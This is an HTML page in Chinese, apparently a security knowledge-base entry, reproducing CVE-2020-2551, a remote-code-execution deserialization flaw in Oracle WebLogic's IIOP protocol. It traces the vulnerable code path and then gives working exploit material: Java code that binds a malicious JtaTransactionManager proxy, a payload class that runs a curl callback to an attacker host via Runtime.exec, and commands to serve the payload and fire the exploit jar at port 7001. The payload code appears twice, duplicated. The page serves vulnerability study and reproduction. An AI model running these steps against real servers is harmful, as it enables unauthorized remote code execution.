<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.csB2D98684{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:14pt;font-weight:bold;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs5BEC2C28{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.csFE4DF89B{text-align:left;margin:2pt 0pt 2pt 0pt;list-style-type:decimal;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.csE3F655E4{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h2 class="cs868C439D">
			<a name="X2a05760090f2dcb26ace637c10c080ed07bd667"><span class="cs83F14626">（</span><span class="csB2D98684">CVE-2020-2551</span><span class="cs83F14626">）</span><span class="csB2D98684">Weblogic CVE-2020-2551 IIOP</span><span class="cs83F14626">协议反序列化</span><span class="csB2D98684">rce</span></a></h2>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">现在我们来看这个漏洞。</span><span class="cs8926E06">IIOP</span><span class="cs9C1B1871">传输的过程中会自动序列化和反序列化，那么我们可以通过向服务器</span><span class="cs8926E06">7001</span><span class="cs9C1B1871">端口发送一个恶意的序列化对象，</span><span class="cs8926E06">IIOP</span><span class="cs9C1B1871">达到</span><span class="cs8926E06">RCE</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">发送恶意序列化对象的过程，其实就是</span><span class="cs8926E06">bind</span><span class="cs9C1B1871">的过程，由此我们可以构造请求</span></p><p class="cs3A447A38"><span class="cs9FB05234">Hashtable&lt;String, String&gt; env = new Hashtable&lt;String, String&gt;();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// add wlsserver/server/lib/weblogic.jar to classpath,else will error.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">env.put(&quot;java.naming.factory.initial&quot;, &quot;weblogic.jndi.WLInitialContextFactory&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">env.put(&quot;java.naming.provider.url&quot;, rhost);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Context context = new InitialContext(env);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// get Object to Deserialize</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">JtaTransactionManager jtaTransactionManager = new JtaTransactionManager();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">jtaTransactionManager.setUserTransactionName(rmiurl);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">Remote remote = createMemoitizedProxy(createMap(&quot;pwned&quot;+System.nanoTime(), jtaTransactionManager), Remote.class);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">context.rebind(&quot;Y4er&quot;+System.nanoTime(), remote);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Hashtable&lt;String, String&gt; env = new Hashtable&lt;String, String&gt;();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// add wlsserver/server/lib/weblogic.jar to classpath,else will error.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">env.put(&quot;java.naming.factory.initial&quot;, &quot;weblogic.jndi.WLInitialContextFactory&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">env.put(&quot;java.naming.provider.url&quot;, rhost);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Context context = new InitialContext(env);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// get Object to Deserialize</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">JtaTransactionManager jtaTransactionManager = new JtaTransactionManager();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">jtaTransactionManager.setUserTransactionName(rmiurl);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">Remote remote = createMemoitizedProxy(createMap(&quot;pwned&quot;+System.nanoTime(), jtaTransactionManager), Remote.class);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">context.rebind(&quot;Y4er&quot;+System.nanoTime(), remote);</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">你肯定疑惑</span><span class="cs5BEC2C28">JtaTransactionManager</span><span class="cs9C1B1871">和</span><span class="cs5BEC2C28">weblogic.jndi.WLInitialContextFactory</span><span class="cs9C1B1871">是从哪来的？</span></p><ol start="1" style="margin-top:0;margin-bottom:0;">
			<li class="csFE4DF89B"><span class="cs8926E06">JtaTransactionManager</span><span class="cs9C1B1871">是</span><span class="cs8926E06">spring</span><span class="cs9C1B1871">爆出的一个可以</span><span class="cs8926E06">JNDI</span><span class="cs9C1B1871">注入的类，在</span><span class="cs8926E06">weblogic</span><span class="cs9C1B1871">中也存在。</span></li><li class="csFE4DF89B"><span class="cs8926E06">weblogic.jndi.WLInitialContextFactory </span><span class="cs9C1B1871">是</span><span class="cs8926E06">weblogic</span><span class="cs9C1B1871">的</span><span class="cs8926E06">JNDI</span><span class="cs9C1B1871">工厂类。</span></li></ol>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">国际惯例，跟一下流程，</span><span class="cs8926E06">IIOP</span><span class="cs9C1B1871">解析数据流的部分看不懂不跟了，从</span><span class="cs8926E06">IIOP</span><span class="cs9C1B1871">开始反序列化对象开始</span></p><p class="cs40DD2BC9"><span class="cs5BEC2C28">E:/source/java/Weblogic/src/main/resources/lib/modules/weblogic.jar!/weblogic/iiop/IIOPInputStream.class:1725</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Weblogic/%ef%bc%88CVE-2020-2551%ef%bc%89Weblogic%20CVE-2020-2551%20IIOP%e5%8d%8f%e8%ae%ae%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96rce_files/image0.png" width="560" height="77" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">此时</span><span class="cs8926E06">var2</span><span class="cs9C1B1871">是序列化传入的</span><span class="cs5BEC2C28">com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager</span><span class="cs9C1B1871">，跟进</span><span class="cs5BEC2C28">readValue()</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Weblogic/%ef%bc%88CVE-2020-2551%ef%bc%89Weblogic%20CVE-2020-2551%20IIOP%e5%8d%8f%e8%ae%ae%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96rce_files/image1.png" width="560" height="199" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">跟进</span><span class="cs8926E06">readValueData()</span><span class="cs9C1B1871">，判断是否有</span><span class="cs8926E06">readObject</span><span class="cs9C1B1871">方法之后进入自身的</span><span class="cs8926E06">readObject()</span><span class="cs9C1B1871">，也就是</span><span class="cs9FB05234">om.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager</span><span class="cs9C1B1871">的</span><span class="cs8926E06">readObject</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Weblogic/%ef%bc%88CVE-2020-2551%ef%bc%89Weblogic%20CVE-2020-2551%20IIOP%e5%8d%8f%e8%ae%ae%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96rce_files/image2.png" width="560" height="405" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后通过反射调用</span><span class="cs5BEC2C28">JtaTransactionManager</span><span class="cs9C1B1871">的</span><span class="cs8926E06">**readObject()**</span><span class="cs9C1B1871">跟进</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Weblogic/%ef%bc%88CVE-2020-2551%ef%bc%89Weblogic%20CVE-2020-2551%20IIOP%e5%8d%8f%e8%ae%ae%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96rce_files/image3.png" width="560" height="127" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">到此之后就是</span><span class="cs8926E06">Weblogic</span><span class="cs9C1B1871">的</span><span class="cs8926E06">CVE-2018-3191 spring JNDI</span><span class="cs9C1B1871">注入了，简单来说就是</span><span class="cs8926E06">lookup()</span><span class="cs9C1B1871">的参数可控，导致可以加载任意类。我们继续跟进</span><span class="cs5BEC2C28">initUserTransactionAndTransactionManager()</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Weblogic/%ef%bc%88CVE-2020-2551%ef%bc%89Weblogic%20CVE-2020-2551%20IIOP%e5%8d%8f%e8%ae%ae%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96rce_files/image4.png" width="560" height="123" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">如果</span><span class="cs5BEC2C28">userTransaction</span><span class="cs9C1B1871">等于空有</span><span class="cs5BEC2C28">userTransactionName</span><span class="cs9C1B1871">属性则进入</span><span class="cs5BEC2C28">lookupUserTransaction()</span><span class="cs9C1B1871">，跟进</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Weblogic/%ef%bc%88CVE-2020-2551%ef%bc%89Weblogic%20CVE-2020-2551%20IIOP%e5%8d%8f%e8%ae%ae%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96rce_files/image5.png" width="560" height="120" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">此时</span><span class="cs8926E06">**lookup()**</span><span class="cs9C1B1871">参数可控</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Weblogic/%ef%bc%88CVE-2020-2551%ef%bc%89Weblogic%20CVE-2020-2551%20IIOP%e5%8d%8f%e8%ae%ae%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96rce_files/image6.png" width="560" height="115" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs5BEC2C28">lookup</span><span class="cs9C1B1871">加载我们的</span><span class="cs8926E06">RMI</span><span class="cs9C1B1871">服务，可以注入恶意</span><span class="cs8926E06">ip</span><span class="cs9C1B1871">的</span><span class="cs8926E06">rmi</span><span class="cs9C1B1871">服务，触发实例化恶意类构造方法调用</span></p><h3 class="cs868C439D">
			<a name="漏洞复现"><span class="csD6CA00D2">漏洞复现</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">https://github.com/ianxtianxt/CVE-2020-2551</span></p><p class="cs40DD2BC9"><span class="csE3F655E4">打包好的</span><span class="cs5BEC2C28">jar</span><span class="csE3F655E4">包</span></p><p class="cs3A447A38"><span class="cs9FB05234">https://download.0-sec.org/download/weblogic_CVE_2020_2551.zip</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">下载</span><span class="cs8926E06">jar</span><span class="cs9C1B1871">包，然后使用</span><span class="cs8926E06">marshalsec</span><span class="cs9C1B1871">起一个恶意的</span><span class="cs8926E06">RMI</span><span class="cs9C1B1871">服务，本地编译一个</span><span class="cs8926E06">exp.java</span></p><p class="cs3A447A38"><span class="cs9FB05234">package payload;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">import java.io.IOException;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">public class exp {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public exp() {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String cmd = &quot;curl http://172.16.1.1/success&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Runtime.getRuntime().exec(cmd).getInputStream();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} catch (IOException e) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;e.printStackTrace();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="csE3F655E4">尽量使用和</span><span class="cs5BEC2C28">weblogic</span><span class="csE3F655E4">相同的版本编译</span><span class="cs8926E06"> </span><span class="cs9C1B1871">然后本地起一个</span><span class="cs8926E06">web</span><span class="cs9C1B1871">服务器</span></p><p class="cs3A447A38"><span class="cs9FB05234">python -m http.server --bind 0.0.0.0 80</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">命令行运行</span><span class="cs8926E06">jar</span><span class="cs9C1B1871">包</span></p><p class="cs3A447A38"><span class="cs9FB05234">java -jar weblogic_CVE_2020_2551.jar 172.16.1.128 7001 rmi://172.16.1.1:1099/exp</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">实际效果如图</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Weblogic/%ef%bc%88CVE-2020-2551%ef%bc%89Weblogic%20CVE-2020-2551%20IIOP%e5%8d%8f%e8%ae%ae%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96rce_files/image0.gif" width="560" height="280" alt="" style="border-width:0px;" /></span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://y4er.com/post/weblogic-cve-2020-2551/</span></p></body>
</html>
